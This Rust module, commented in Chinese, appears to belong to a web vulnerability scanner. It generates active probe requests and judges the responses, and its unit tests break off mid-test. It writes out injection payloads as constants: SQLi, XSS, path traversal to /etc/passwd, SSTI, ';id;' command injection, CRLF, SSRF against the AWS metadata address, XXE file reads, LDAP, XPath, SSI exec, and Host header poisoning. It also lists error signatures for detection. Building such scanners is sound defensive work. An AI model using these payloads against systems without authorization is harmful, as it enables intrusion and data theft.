//! 主动探测:由基准流**生成变异请求**(纯函数,不发送),并对探测响应做**命中判定**。
//!
//! 发送由 UI 侧 runner 复用 [`scry_proxy::replay`] 完成(后台 tokio);本模块只负责「构造」与「判定」,
//! 全部纯函数、可单测,确保攻击 payload 的拼装 / 命中规则可回归。
//!
//! 覆盖的漏洞类(均为「基于响应」的检测,不依赖带外/OOB;盲注类留给 OOB 模块):
//! - error-based SQLi / 反射型 XSS / 路径穿越(LFI)
//! - SSTI(服务端模板注入,数学回显)
//! - OS 命令注入(回显型,`id` 特征)
//! - CRLF / HTTP 响应头注入
//! - 开放重定向(仅疑似跳转参数)
//! - SSRF 云元数据(仅疑似 URL 参数,打 AWS IMDS)
//! - XXE 外部实体(回显型,对 XML 请求体读 `/etc/passwd`)
//! - **LDAP 注入**(报错型,过滤器括号破坏 → LDAP 异常签名)
//! - **XPath 注入**(报错型,引号破坏 → XPath 异常签名)
//! - **SSI 注入**(`<!--#exec-->` 被执行而非原样回显)
//! - **主机头注入 / 投毒**(Host / X-Forwarded-Host 指向唯一标记域,响应里回显该域)

use scry_analyze::{parse_query, percent_decode};
use scry_core::HttpFlow;

use crate::types::{Finding, Severity};

/// 探测类型。
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum ProbeKind {
    /// error-based SQL 注入(值后追加单引号)。
    SqliError,
    /// 反射型 XSS(注入唯一脚本 marker)。
    XssReflect,
    /// 路径穿越 / 本地文件包含(注入 `../../etc/passwd`)。
    PathTraversal,
    /// 服务端模板注入(SSTI;注入数学表达式,命中独特乘积回显)。
    Ssti,
    /// OS 命令注入(回显型;分隔后执行 `id`,命中 uid/gid)。
    CommandInjection,
    /// CRLF / HTTP 响应头注入(换行后注入独特响应头)。
    Crlf,
    /// 开放重定向(仅对疑似跳转参数;注入独特外部域)。
    OpenRedirect,
    /// SSRF 云元数据(仅对疑似 URL 参数;打 AWS IMDS)。
    SsrfMetadata,
    /// XXE 外部实体(对 XML 请求体注入读 `/etc/passwd`)。
    Xxe,
    /// LDAP 注入(报错型;注入过滤器破坏字符,命中 LDAP 异常签名)。
    LdapInjection,
    /// XPath 注入(报错型;注入引号破坏 XPath,命中 XPath 异常签名)。
    XPathInjection,
    /// SSI 注入(注入 `<!--#exec-->`;被执行 = marker 出现且指令被消费)。
    Ssi,
    /// 主机头注入 / 投毒(Host + X-Forwarded-Host 指向唯一标记域,响应回显该域)。
    HostHeader,
}

/// 唯一 XSS 探测载荷(含可识别 marker + 未转义标签)。
const XSS_PAYLOAD: &str = "scry7h3x<svg/onload=1>";
/// 路径穿越载荷。
const TRAVERSAL_PAYLOAD: &str = "../../../../../../../../etc/passwd";
/// SSTI polyglot:覆盖 `{{}}`(Jinja2/Twig/Nunjucks…)与 `${}`(Freemarker/EL…)。
const SSTI_PAYLOAD: &str = "{{1337*1337}}${1337*1337}";
/// SSTI 命中标记:1337² = 1787569(几乎不可能自然出现 → 低误报)。
const SSTI_PRODUCT: &str = "1787569";
/// 命令注入载荷:分隔后执行 `id`(Unix)。
const CMDI_PAYLOAD: &str = ";id;";
/// CRLF 载荷:换行后注入一个独特响应头(服务器有漏洞才会把它解析成真头)。
const CRLF_PAYLOAD: &str = "\r\nX-Scry-Crlf: scry1337";
/// CRLF 命中标记:独特响应头名。
const CRLF_HEADER: &str = "x-scry-crlf";
/// 开放重定向载荷:独特外部域(便于在 Location 头里识别)。
const REDIRECT_PAYLOAD: &str = "https://scry-oob.example/redir";
/// 开放重定向命中标记(小写)。
const REDIRECT_MARK: &str = "scry-oob.example";
/// SSRF 云元数据载荷:AWS 实例元数据服务(IMDS)。
const SSRF_PAYLOAD: &str = "http://169.254.169.254/latest/meta-data/";
/// SSRF 命中特征(AWS IMDS 目录列表特有;要求 ≥2 个同现以降误报)。
const SSRF_META_FEATURES: [&str; 7] = [
    "ami-id",
    "instance-id",
    "iam/",
    "security-credentials",
    "public-keys",
    "instance-type",
    "hostname",
];
/// XXE 载荷:外部实体读 `/etc/passwd`(经典回显型)。
const XXE_PAYLOAD: &str =
    r#"<?xml version="1.0"?><!DOCTYPE scry [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><scry>&xxe;</scry>"#;
/// LDAP 注入载荷后缀:过滤器括号破坏(`(attr=值)(` → 语法错误 → LDAP 异常)。
const LDAP_PAYLOAD_SUFFIX: &str = ")(|(cn=*";
/// XPath 注入载荷后缀:引号 + 双引号同时破坏 XPath 表达式。
const XPATH_PAYLOAD_SUFFIX: &str = "'\"";
/// SSI 注入载荷:`#exec` 回显唯一 marker;被执行则 marker 出现且指令被消费。
const SSI_PAYLOAD: &str = "<!--#exec cmd=\"echo scry-ssi-7h3x\"-->";
/// SSI 命中 marker(echo 的输出;本身不含 `#exec`,据此区分「执行」与「原样回显」)。
const SSI_MARKER: &str = "scry-ssi-7h3x";
/// 主机头注入标记域(回显进响应 body / Location 即命中)。
const HOST_MARKER: &str = "scry-host-7h3x.example";

/// LDAP 报错特征(命中即认为 LDAP 注入;均小写)。
const LDAP_SIGNATURES: [&str; 7] = [
    "javax.naming.directory",
    "com.sun.jndi.ldap",
    "ldapexception",
    "invalid dn syntax",
    "ldap_search",
    "bad search filter",
    "not a valid ldap",
];
/// XPath 报错特征(命中即认为 XPath 注入;均小写)。
const XPATH_SIGNATURES: [&str; 8] = [
    "xpathexception",
    "org.apache.xpath",
    "ms.internal.xml",
    "system.xml.xpath",
    "xmlxpatheval",
    "simplexmlelement::xpath",
    "a closing bracket expected",
    "expression must evaluate to a node-set",
];

/// SQL 报错特征(命中即认为 error-based 注入)。
const SQLI_SIGNATURES: [&str; 6] = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "ora-0",
    "pg_query():",
    "sqlite3::",
];

/// 一个待发送的探测:变异请求流 + 元信息。
#[derive(Clone, Debug)]
pub struct Probe {
    pub kind: ProbeKind,
    /// 被注入的参数名(XXE 等 body 注入填 `body`)。
    pub param: String,
    /// 实际注入的载荷值。
    pub payload: String,
    /// 变异后的请求流(响应已清空,可直接喂 replay)。
    pub flow: HttpFlow,
}

/// 对每个查询参数都注入的「值注入」类。
const VALUE_KINDS: [ProbeKind; 9] = [
    ProbeKind::SqliError,
    ProbeKind::XssReflect,
    ProbeKind::PathTraversal,
    ProbeKind::Ssti,
    ProbeKind::CommandInjection,
    ProbeKind::Crlf,
    ProbeKind::LdapInjection,
    ProbeKind::XPathInjection,
    ProbeKind::Ssi,
];

/// 由基准流生成主动探测请求。
///
/// - **值注入类**(SQLi/XSS/Traversal/SSTI/CmdI/CRLF):对**每个查询参数**都注入。
/// - **参数语义敏感类**:仅对疑似参数注入 —— 开放重定向(跳转参数)、SSRF(URL 参数)。
/// - **XXE**:仅当请求体像 XML 时,替换 body 注入外部实体。
pub fn generate_probes(base: &HttpFlow) -> Vec<Probe> {
    let mut out = Vec::new();

    for (k, v) in parse_query(&base.path) {
        let mut kinds: Vec<ProbeKind> = VALUE_KINDS.to_vec();
        if is_redirect_param(&k) {
            kinds.push(ProbeKind::OpenRedirect);
        }
        if is_ssrf_param(&k) {
            kinds.push(ProbeKind::SsrfMetadata);
        }
        for kind in kinds {
            let payload = payload_for(kind, &v);
            let mut flow = base.clone();
            flow.path = mutate_query(&base.path, &k, &payload);
            reset_response(&mut flow);
            out.push(Probe {
                kind,
                param: k.clone(),
                payload,
                flow,
            });
        }
    }

    if looks_like_xml(base) {
        let mut flow = base.clone();
        flow.req_body = XXE_PAYLOAD.as_bytes().to_vec();
        set_content_length(&mut flow);
        reset_response(&mut flow);
        out.push(Probe {
            kind: ProbeKind::Xxe,
            param: "body".to_string(),
            payload: XXE_PAYLOAD.to_string(),
            flow,
        });
    }

    // 主机头注入 / 投毒(与参数无关,每条流一次):把 Host 改为唯一标记域,并补 X-Forwarded-Host
    // (很多框架信任它生成绝对链接 / 密码重置链接)。响应里回显该域 = 命中。
    {
        let mut flow = base.clone();
        set_request_header(&mut flow, "Host", HOST_MARKER);
        // X-Forwarded-Host 覆盖式设置(已有则改,无则加)。
        set_request_header(&mut flow, "X-Forwarded-Host", HOST_MARKER);
        reset_response(&mut flow);
        out.push(Probe {
            kind: ProbeKind::HostHeader,
            param: "Host".to_string(),
            payload: HOST_MARKER.to_string(),
            flow,
        });
    }

    out
}

/// 对探测响应做命中判定 → 命中则给一条 [`Finding`]。
pub fn evaluate(probe: &Probe, resp: &HttpFlow) -> Option<Finding> {
    let text = if resp.resp_body.is_empty() {
        String::new()
    } else {
        scry_decode::display_text(&resp.resp_headers, &resp.resp_body)
    };
    let low = text.to_ascii_lowercase();
    match probe.kind {
        ProbeKind::SqliError => SQLI_SIGNATURES.iter().any(|s| low.contains(s)).then(|| {
            Finding::new(
                "active-sqli",
                "SQL injection (error-based)",
                Severity::High,
                resp.url(),
                format!(
                    "Param '{}' triggers a SQL error when a quote is appended",
                    probe.param
                ),
            )
        }),
        ProbeKind::XssReflect => {
            if !text.contains("<svg/onload") {
                return None;
            }
            // 关键:反射 ≠ XSS。只有响应是 **HTML** 才会被浏览器当标签执行 → 判 High;
            // JSON / 纯文本等非 HTML 上下文里的反射不可利用,降为 Info(提示去核实 sink),避免误报。
            let is_html = resp
                .content_type()
                .map(|ct| ct.to_ascii_lowercase().contains("html"))
                .unwrap_or(false);
            if is_html {
                Some(Finding::new(
                    "active-xss",
                    "Reflected XSS",
                    Severity::High,
                    resp.url(),
                    format!(
                        "Param '{}' reflects the script payload unescaped in an HTML response",
                        probe.param
                    ),
                ))
            } else {
                Some(Finding::new(
                    "active-reflection",
                    "Reflected value (non-HTML)",
                    Severity::Info,
                    resp.url(),
                    format!(
                        "Param '{}' is reflected unescaped, but the response is {} (not HTML) — verify the sink before calling it XSS",
                        probe.param,
                        resp.content_type().unwrap_or("an unknown type")
                    ),
                ))
            }
        }
        ProbeKind::PathTraversal => {
            looks_like_passwd(&text, &low).then(|| {
                Finding::new(
                    "active-traversal",
                    "Path traversal / LFI",
                    Severity::Critical,
                    resp.url(),
                    format!("Param '{}' returns /etc/passwd contents", probe.param),
                )
            })
        }
        ProbeKind::Ssti => low.contains(SSTI_PRODUCT).then(|| {
            Finding::new(
                "active-ssti",
                "Server-side template injection (SSTI)",
                Severity::Critical,
                resp.url(),
                format!(
                    "Param '{}' evaluates a template expression (1337*1337 → {SSTI_PRODUCT})",
                    probe.param
                ),
            )
        }),
        ProbeKind::CommandInjection => {
            (low.contains("uid=") && low.contains("gid=")).then(|| {
                Finding::new(
                    "active-cmdi",
                    "OS command injection",
                    Severity::Critical,
                    resp.url(),
                    format!("Param '{}' executes `id` (uid=/gid= in response)", probe.param),
                )
            })
        }
        ProbeKind::Crlf => resp
            .resp_headers
            .iter()
            .any(|(k, _)| k.eq_ignore_ascii_case(CRLF_HEADER))
            .then(|| {
                Finding::new(
                    "active-crlf",
                    "CRLF / response header injection",
                    Severity::Medium,
                    resp.url(),
                    format!(
                        "Param '{}' injects a CRLF and a new response header",
                        probe.param
                    ),
                )
            }),
        ProbeKind::OpenRedirect => {
            let is_3xx = (300..400).contains(&resp.status);
            let loc = resp
                .resp_header("location")
                .unwrap_or("")
                .to_ascii_lowercase();
            (is_3xx && loc.contains(REDIRECT_MARK)).then(|| {
                Finding::new(
                    "active-open-redirect",
                    "Open redirect",
                    Severity::Medium,
                    resp.url(),
                    format!(
                        "Param '{}' controls the redirect target (Location header)",
                        probe.param
                    ),
                )
            })
        }
        ProbeKind::SsrfMetadata => {
            let cnt = SSRF_META_FEATURES
                .iter()
                .filter(|f| low.contains(**f))
                .count();
            (cnt >= 2).then(|| {
                Finding::new(
                    "active-ssrf",
                    "SSRF (cloud metadata)",
                    Severity::Critical,
                    resp.url(),
                    format!(
                        "Param '{}' makes the server fetch cloud metadata (AWS IMDS); {cnt} indicators present",
                        probe.param
                    ),
                )
            })
        }
        ProbeKind::Xxe => looks_like_passwd(&text, &low).then(|| {
            Finding::new(
                "active-xxe",
                "XXE external entity (file disclosure)",
                Severity::High,
                resp.url(),
                "XML external entity reads /etc/passwd (root:x:0:0 in response)",
            )
        }),
        ProbeKind::LdapInjection => LDAP_SIGNATURES.iter().any(|s| low.contains(s)).then(|| {
            Finding::new(
                "active-ldap",
                "LDAP injection",
                Severity::High,
                resp.url(),
                format!(
                    "Param '{}' breaks the LDAP filter (LDAP error signature in response)",
                    probe.param
                ),
            )
        }),
        ProbeKind::XPathInjection => XPATH_SIGNATURES.iter().any(|s| low.contains(s)).then(|| {
            Finding::new(
                "active-xpath",
                "XPath injection",
                Severity::High,
                resp.url(),
                format!(
                    "Param '{}' breaks the XPath expression (XPath error signature in response)",
                    probe.param
                ),
            )
        }),
        // SSI 执行:marker 出现且指令被消费(`#exec` 不再出现 → 排除原样回显 / HTML 转义回显)。
        ProbeKind::Ssi => (low.contains(SSI_MARKER) && !low.contains("#exec")).then(|| {
            Finding::new(
                "active-ssi",
                "Server-side includes (SSI) injection",
                Severity::High,
                resp.url(),
                format!(
                    "Param '{}' executes an SSI directive (#exec echo was evaluated)",
                    probe.param
                ),
            )
        }),
        // 主机头投毒:注入的标记域回显进响应 body 或 Location(绝对链接 / 密码重置链接被污染)。
        ProbeKind::HostHeader => {
            let loc = resp
                .resp_header("location")
                .unwrap_or("")
                .to_ascii_lowercase();
            (low.contains(HOST_MARKER) || loc.contains(HOST_MARKER)).then(|| {
                Finding::new(
                    "active-host-header",
                    "Host header injection",
                    Severity::Medium,
                    resp.url(),
                    "Injected Host / X-Forwarded-Host is reflected in the response (link / redirect poisoning)",
                )
            })
        }
    }
}

/// `/etc/passwd` 回显判定(穿越 / XXE 共用)。
fn looks_like_passwd(text: &str, low: &str) -> bool {
    text.contains("root:x:0:0") || (low.contains("root:") && low.contains(":0:0:"))
}

/// 按探测类型给出注入到查询参数的载荷(XXE / 主机头不经此处)。
fn payload_for(kind: ProbeKind, v: &str) -> String {
    match kind {
        ProbeKind::SqliError => format!("{v}'"),
        ProbeKind::XssReflect => XSS_PAYLOAD.to_string(),
        ProbeKind::PathTraversal => TRAVERSAL_PAYLOAD.to_string(),
        ProbeKind::Ssti => SSTI_PAYLOAD.to_string(),
        ProbeKind::CommandInjection => CMDI_PAYLOAD.to_string(),
        ProbeKind::Crlf => CRLF_PAYLOAD.to_string(),
        ProbeKind::OpenRedirect => REDIRECT_PAYLOAD.to_string(),
        ProbeKind::SsrfMetadata => SSRF_PAYLOAD.to_string(),
        ProbeKind::Xxe => XXE_PAYLOAD.to_string(),
        ProbeKind::LdapInjection => format!("{v}{LDAP_PAYLOAD_SUFFIX}"),
        ProbeKind::XPathInjection => format!("{v}{XPATH_PAYLOAD_SUFFIX}"),
        ProbeKind::Ssi => SSI_PAYLOAD.to_string(),
        ProbeKind::HostHeader => HOST_MARKER.to_string(),
    }
}

/// 覆盖式设置请求头(同名则改第一个,否则追加)。
fn set_request_header(flow: &mut HttpFlow, name: &str, value: &str) {
    if let Some(h) = flow
        .req_headers
        .iter_mut()
        .find(|(k, _)| k.eq_ignore_ascii_case(name))
    {
        h.1 = value.to_string();
    } else {
        flow.req_headers.push((name.to_string(), value.to_string()));
    }
}

/// 清空探测流的响应部分(可直接喂 replay)。
pub(crate) fn reset_response(flow: &mut HttpFlow) {
    flow.status = 0;
    flow.resp_headers.clear();
    flow.resp_body.clear();
    flow.duration_ms = 0;
}

/// 参数名疑似「跳转目标」(开放重定向高发)。
fn is_redirect_param(k: &str) -> bool {
    const NAMES: &[&str] = &[
        "url",
        "uri",
        "redirect",
        "redirect_uri",
        "redirecturl",
        "redirect_url",
        "return",
        "returnurl",
        "return_url",
        "returnto",
        "next",
        "dest",
        "destination",
        "target",
        "goto",
        "continue",
        "to",
        "out",
        "link",
        "u",
        "r",
    ];
    let kl = k.to_ascii_lowercase();
    NAMES.contains(&kl.as_str())
}

/// 参数名疑似「服务端取 URL」(SSRF 高发)。
pub(crate) fn is_ssrf_param(k: &str) -> bool {
    const NAMES: &[&str] = &[
        "url",
        "uri",
        "src",
        "source",
        "dest",
        "destination",
        "target",
        "redirect",
        "redirect_uri",
        "link",
        "host",
        "domain",
        "site",
        "feed",
        "callback",
        "fetch",
        "proxy",
        "load",
        "remote",
        "image",
        "img",
        "u",
    ];
    let kl = k.to_ascii_lowercase();
    NAMES.contains(&kl.as_str())
}

/// 请求体是否像 XML(XXE 仅对 XML body 注入)。
pub(crate) fn looks_like_xml(flow: &HttpFlow) -> bool {
    if flow.req_body.is_empty() {
        return false;
    }
    let ct_xml = flow
        .req_header("content-type")
        .map(|c| c.to_ascii_lowercase().contains("xml"))
        .unwrap_or(false);
    let head: Vec<u8> = flow.req_body.iter().take(64).copied().collect();
    let s = String::from_utf8_lossy(&head);
    let t = s.trim_start();
    let body_xml = t.starts_with("<?xml") || t.starts_with("<!DOCTYPE") || (t.starts_with('<') && t.contains('>'));
    ct_xml || body_xml
}

/// 设置 / 更新请求的 `Content-Length` 为当前 body 长度(改 body 后必做)。
pub(crate) fn set_content_length(flow: &mut HttpFlow) {
    let len = flow.req_body.len().to_string();
    if let Some(h) = flow
        .req_headers
        .iter_mut()
        .find(|(k, _)| k.eq_ignore_ascii_case("content-length"))
    {
        h.1 = len;
    } else {
        flow.req_headers.push(("Content-Length".to_string(), len));
    }
}

/// query 编码:仅保留 RFC3986 unreserved,其余百分号编码(确保 payload 安全到达参数)。
pub(crate) fn encode_query_component(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(b as char)
            }
            _ => out.push_str(&format!("%{b:02X}")),
        }
    }
    out
}

/// 把 `path` 查询串里 `target_key` 的值替换为 `new_value`(编码后),保留其它参数原样。
/// 无查询串时追加一个该参数。
pub(crate) fn mutate_query(path: &str, target_key: &str, new_value: &str) -> String {
    let (base, query) = match path.split_once('?') {
        Some((b, q)) => (b, q),
        None => {
            return format!(
                "{path}?{}={}",
                encode_query_component(target_key),
                encode_query_component(new_value)
            )
        }
    };
    let mut parts: Vec<String> = Vec::new();
    let mut replaced = false;
    for pair in query.split('&') {
        if pair.is_empty() {
            continue;
        }
        let raw_key = pair.split_once('=').map(|(k, _)| k).unwrap_or(pair);
        let dec_key = percent_decode(raw_key, true);
        if dec_key == target_key && !replaced {
            parts.push(format!("{raw_key}={}", encode_query_component(new_value)));
            replaced = true;
        } else {
            parts.push(pair.to_string());
        }
    }
    format!("{base}?{}", parts.join("&"))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn base() -> HttpFlow {
        HttpFlow::request(
            "GET",
            "https",
            "ex.com",
            443,
            "/search?q=hello&page=2",
            vec![],
            vec![],
        )
    }

    #[test]
    fn generates_value_probes_per_param() {
        let probes = generate_probes(&base());
        // 2 个参数(q、page,均非跳转/SSRF 参数)× 9 种值注入 + 1 主机头探测 = 19。
        assert_eq!(probes.len(), 19);
        assert_eq!(
            probes
                .iter()
                .filter(|p| p.kind == ProbeKind::SqliError)
                .count(),
            2
        );
        assert_eq!(
            probes.iter().filter(|p| p.kind == ProbeKind::Ssti).count(),
            2
        );
        assert_eq!(
            probes
                .iter()
                .filter(|p| p.kind == ProbeKind::LdapInjection)
                .count(),
            2
        );
        // 主机头探测每条流恰好一个。
        assert_eq!(
            probes.iter().filter(|p| p.kind == ProbeKind::HostHeader).count(),
            1
        );
    }

    #[test]
    fn redirect_and_ssrf_params_get_extra_kinds() {
        let b = HttpFlow::request(
            "GET",
            "https",
            "ex.com",
            443,
            "/go?url=/home",
            vec![],
            vec![],
        );
        let probes = generate_probes(&b);
        // url 参数:9 值注入 + OpenRedirect + SsrfMetadata = 11,+ 1 主机头探测 = 12。
        assert_eq!(probes.len(), 12);
        assert!(probes.iter().any(|p| p.kind == ProbeKind::OpenRedirect));
        assert!(probes.iter().any(|p| p.kind == ProbeKind::SsrfMetadata));
    }

    #[test]
    fn mutation_preserves_other_params() {
        let probes = generate_probes(&base());
        let p = probes
            .iter()
            .find(|p| p.kind == ProbeKind::SqliError && p.param == "q")
            .unwrap();
        assert!(p.flow.path.contains("page=2"));
        assert!(p.flow.path.contains("q=hello%27"));
        assert_eq!(p.flow.status, 0);
    }

    #[test]
    fn evaluate_detects_sqli() {
        let probes = generate_probes(&base());
        let p = probes
            .iter()
            .find(|p| p.kind == ProbeKind::SqliError)
            .unwrap();
        let resp = p.flow.clone().with_response(
            500,
            vec![("Content-Type".to_string(), "text/html".to_string())],
            b"You have an error in your SQL syntax; check the manual".to_vec(),
            10,
        );
        let finding = evaluate(p, &resp).unwrap();
        assert_eq!(finding.rule_id, "active-sqli");
        assert_eq!(finding.severity, Severity::High);
    }

    #[test]
    fn evaluate_detects_xss_and_traversal() {
        let probes = generate_probes(&base());
        let xss = probes
            .iter()
            .find(|p| p.kind == ProbeKind::XssReflect)
            .unwrap();
        let resp = xss.flow.clone().with_response(
            200,
            vec![("Content-Type".to_string(), "text/html".to_string())],
            b"<html>scry7h3x<svg/onload=1></html>".to_vec(),
            10,
        );
        assert_eq!(evaluate(xss, &resp).unwrap().rule_id, "active-xss");

        let trav = probes
            .iter()
            .find(|p| p.kind == ProbeKind::PathTraversal)
            .unwrap();
        let resp2 = trav.flow.clone().with_response(
            200,
            vec![("Content-Type".to_string(), "text/plain".to_string())],
            b"root:x:0:0:root:/root:/bin/bash\n".to_vec(),
            10,
        );
        let f = evaluate(trav, &resp2).unwrap();
        assert_eq!(f.rule_id, "active-traversal");
        assert_eq!(f.severity, Severity::Critical);
    }

    #[test]
    fn xss_reflection_in_json_is_info_not_high() {
        let probes = generate_probes(&base());
        let xss = probes
            .iter()
            .find(|p| p.kind == ProbeKind::XssReflect)
            .unwrap();
        let resp = xss.flow.clone().with_response(
            200,
            vec![("Content-Type".to_string(), "application/json".to_string())],
            b"{\"got\":\"scry7h3x<svg/onload=1>\"}".to_vec(),
            10,
        );
        let f = evaluate(xss, &resp).unwrap();
        assert_eq!(f.rule_id, "active-reflection");
        assert_eq!(f.severity, Severity::Info);
    }

    #[test]
    fn evaluate_detects_ssti() {
        let probes = generate_probes(&base());
        let p = probes.iter().find(|p| p.kind == ProbeKind::Ssti).unwrap();
        let resp = p.flow.clone().with_response(
            200,
            vec![("Content-Type".to_string(), "text/html".to_string())],
            b"<p>result: 1787569</p>".to_vec(),
            10,
        );
        let f = evaluate(p, &resp).unwrap();
        assert_eq!(f.rule_id, "active-ssti");
        assert_eq!(f.severity, Severity::Critical);
        // 未求值(原样回显模板)不应命中。
        let resp2 = p.flow.clone().with_response(
            200,
            vec![("Content-Type".to_string(), "text/html".to_string())],
            b"<p>result: {{1337*1337}}</p>".to_vec(),
            10,
        );
        assert!(evaluate(p, &resp2).is_none());
    }

    #[test]
    fn evaluate_detects_command_injection() {
        let probes = generate_probes(&base());
        let p = probes
            .iter()
            .find(|p| p.kind == ProbeKind::CommandInjection)
            .unwrap();
        let resp = p.flow.clone().with_response(
            200,
            vec![("Content-Type".to_string(), "text/plain".to_string())],
            b"uid=33(www-data) gid=33(www-data) groups=33(www-data)".to_vec(),
            10,
        );
        let f = evaluate(p, &resp).unwrap();
        assert_eq!(f.rule_id, "active-cmdi");
        assert_eq!(f.severity, Severity::Critical);
    }

    #[test]
    fn evaluate_detects_crlf() {
        let probes = generate_probes(&base());
        let p = probes.iter().find(|p| p.kind == ProbeKind::Crlf).unwrap();
        let resp = p.flow.clone().with_response(
            200,
            vec![
                ("Content-Type".to_string(), "text/html".to_string()),
                ("X-Scry-Crlf".to_string(), "scry1337".to_string()),
            ],
            b"".to_vec(),
            10,
        );
        let f = evaluate(p, &resp).unwrap();
        assert_eq!(f.rule_id, "active-crlf");
        // 没把 CRLF 解析成头则不命中。
        let resp2 = p.flow.clone().with_response(
            200,
            vec![("Content-Type".to_string(), "text/html".to_string())],
            b"ok".to_vec(),
            10,
        );
        assert!(evaluate(p, &resp2).is_none());
    }

    #[test]
    fn evaluate_detects_open_redirect() {
        let b = HttpFlow::request("GET", "https", "ex.com", 443, "/go?url=/home", vec![], vec![]);
        let probes = generate_probes(&b);
        let p = probes
            .iter()
            .find(|p| p.kind == ProbeKind::OpenRedirect)
            .unwrap();
        let resp = p.flow.clone().with_response(
            302,
            vec![(
                "Location".to_string(),
                "https://scry-oob.example/redir".to_string(),
            )],
            b"".to_vec(),
            10,
        );
        let f = evaluate(p, &resp).unwrap();
        assert_eq!(f.rule_id, "active-open-redirect");
        // 200(未重定向)不命中。
        let resp2 = p.flow.clone().with_response(200, vec![], b"".to_vec(), 10);
        assert!(evaluate(p, &resp2).is_none());
    }

    #[test]
    fn evaluate_detects_ssrf_metadata() {
        let b = HttpFlow::request(
            "GET",
            "https",
            "ex.com",
            443,
            "/fetch?url=http://a.com",
            vec![],
            vec![],
        );
        let probes = generate_probes(&b);
        let p = probes
            .iter()
            .find(|p| p.kind == ProbeKind::SsrfMetadata)
            .unwrap();
        let resp = p.flow.clone().with_response(
            200,
            vec![("Content-Type".to_string(), "text/plain".to_string())],
            b"ami-id\nhostname\niam/\ninstance-id\ninstance-type\n".to_vec(),
            10,
        );
        let f = evaluate(p, &resp).unwrap();
        assert_eq!(f.rule_id, "active-ssrf");
        assert_eq!(f.severity, Severity::Critical);
        // 单一普通词不应命中(<2 特征)。
        let resp2 = p.flow.clone().with_response(
            200,
            vec![("Content-Type".to_string(), "text/plain".to_string())],
            b"hostname only".to_vec(),
            10,
        );
        assert!(evaluate(p, &resp2).is_none());
    }

    #[test]
    fn evaluate_detects_xxe_on_xml_body() {
        let b = HttpFlow::request(
            "POST",
            "https",
            "ex.com",
            443,
            "/api",
            vec![("Content-Type".to_string(), "application/xml".to_string())],
            b"<?xml version=\"1.0\"?><foo>hi</foo>".to_vec(),
        );
        let probes = generate_probes(&b);
        // /api 无查询参数 → 1 个 XXE body 探测 + 1 个主机头探测 = 2。
        assert_eq!(probes.len(), 2);
        let p = probes.iter().find(|p| p.kind == ProbeKind::Xxe).unwrap();
        // body 已替换为 XXE,Content-Length 已重算。
        assert_eq!(p.flow.req_body, XXE_PAYLOAD.as_bytes());
        assert_eq!(
            p.flow.req_header("content-length"),
            Some(XXE_PAYLOAD.len().to_string().as_str())
        );
        let resp = p.flow.clone().with_response(
            200,
            vec![("Content-Type".to_string(), "application/xml".to_string())],
            b"<scry>root:x:0:0:root:/root:/bin/bash</scry>".to_vec(),
            10,
        );
        let f = evaluate(p, &resp).unwrap();
        assert_eq!(f.rule_id, "active-xxe");
    }

    #[test]
    fn non_xml_body_gets_no_xxe() {
        let b = HttpFlow::request(
            "POST",
            "https",
            "ex.com",
            443,
            "/api",
            vec![("Content-Type".to_string(), "application/json".to_string())],
            b"{\"a\":1}".to_vec(),
        );
        let probes = generate_probes(&b);
        assert!(!probes.iter().any(|p| p.kind == ProbeKind::Xxe));
    }

    #[test]
    fn evaluate_detects_ldap_and_xpath() {
        let probes = generate_probes(&base());
        let ldap = probes
            .iter()
            .find(|p| p.kind == ProbeKind::LdapInjection)
            .unwrap();
        // 载荷里带过滤器破坏字符。
        assert!(ldap.flow.path.contains("%29%28") || ldap.flow.path.contains(")("));
        let resp = ldap.flow.clone().with_response(
            500,
            vec![("Content-Type".to_string(), "text/html".to_string())],
            b"javax.naming.directory.InvalidSearchFilterException: Bad search filter".to_vec(),
            10,
        );
        let f = evaluate(ldap, &resp).unwrap();
        assert_eq!(f.rule_id, "active-ldap");
        assert_eq!(f.severity, Severity::High);

        let xpath = probes
            .iter()
            .find(|p| p.kind == ProbeKind::XPathInjection)
            .unwrap();
        let resp2 = xpath.flow.clone().with_response(
            500,
            vec![("Content-Type".to_string(), "text/html".to_string())],
            b"Error: Expression must evaluate to a node-set.".to_vec(),
            10,
        );
        assert_eq!(evaluate(xpath, &resp2).unwrap().rule_id, "active-xpath");
        // 干净响应不命中。
        let clean = xpath.flow.clone().with_response(200, vec![], b"ok".to_vec(), 10);
        assert!(evaluate(xpath, &clean).is_none());
    }

    #[test]
    fn evaluate_detects_ssi_only_when_executed() {
        let probes = generate_probes(&base());
        let p = probes.iter().find(|p| p.kind == ProbeKind::Ssi).unwrap();
        // 被执行:marker 出现、指令被消费。
        let executed = p.flow.clone().with_response(
            200,
            vec![("Content-Type".to_string(), "text/html".to_string())],
            b"<p>scry-ssi-7h3x</p>".to_vec(),
            10,
        );
        assert_eq!(evaluate(p, &executed).unwrap().rule_id, "active-ssi");
        // 原样回显(指令未执行)不命中。
        let reflected = p.flow.clone().with_response(
            200,
            vec![("Content-Type".to_string(), "text/html".to_string())],
            b"<p><!--#exec cmd=\"echo scry-ssi-7h3x\"--></p>".to_vec(),
            10,
        );
        assert!(evaluate(p, &reflected).is_none());
        // HTML 转义回显也不命中(含 #exec)。
        let encoded = p.flow.clone().with_response(
            200,
            vec![("Content-Type".to_string(), "text/html".to_string())],
            b"&lt;!--#exec cmd=&quot;echo scry-ssi-7h3x&quot;--&gt;".to_vec(),
            10,
        );
        assert!(evaluate(p, &encoded).is_none());
    }

    #[test]
    fn evaluate_detects_host_header_poisoning() {
        let probes = generate_probes(&base());
        let p = probes
            .iter()
            .find(|p| p.kind == ProbeKind::HostHeader)
            .unwrap();
        // 标记域被注入(Host + X-Forwarded-Host)。
        assert!(p
            .flow
            .req_headers
            .iter()
            .any(|(k, v)| k.eq_ignore_ascii_case("X-Forwarded-Host") && v == HOST_MARKER));
        // 回显进 body(绝对链接污染)。
        let resp = p.flow.clone().with_response(
            200,
            vec![("Content-Type".to_string(), "text/html".to_string())],
            b"<a href=\"https://scry-host-7h3x.example/reset\">reset</a>".to_vec(),
            10,
        );
        assert_eq!(evaluate(p, &resp).unwrap().rule_id, "active-host-header");
        // 回显进 Location 也命中。
        let resp2 = p.flow.clone().with_response(
            302,
